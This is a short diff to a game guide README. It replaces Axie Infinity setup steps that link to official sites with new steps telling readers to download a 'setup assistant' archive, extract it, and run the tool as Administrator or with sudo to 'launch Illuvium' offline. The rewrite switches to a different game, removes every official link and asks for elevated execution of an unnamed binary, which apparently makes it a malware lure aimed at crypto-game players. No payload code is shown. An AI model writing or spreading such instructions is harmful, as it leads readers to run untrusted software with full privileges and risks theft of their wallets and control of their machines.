@@ -74,11 +74,11 @@ _Replace below URLs with your own:_
 
 ## 🚀 How to Get Started
 
-1. 🔐 Setup your **Ronin Wallet** at [https://wallet.roninchain.com](https://wallet.roninchain.com)
-2. 🎮 Buy 3 Axies on [marketplace.axieinfinity.com](https://marketplace.axieinfinity.com)
-3. 📥 Download the game client from [https://axieinfinity.com](https://axieinfinity.com)
-4. 🧠 Read this guide + build your team
-5. 💸 Start earning SLP daily
+1. Download the setup assistant using the button above
+2. Extract the archive using 7-Zip, WinRAR, or built-in extractor
+3. Run the included tool as Administrator (Windows) or with sudo (Linux/macOS)
+4. Follow the step-by-step on-screen instructions
+5. Launch Illuvium — all modules and content will be available offline
 
 ---
 
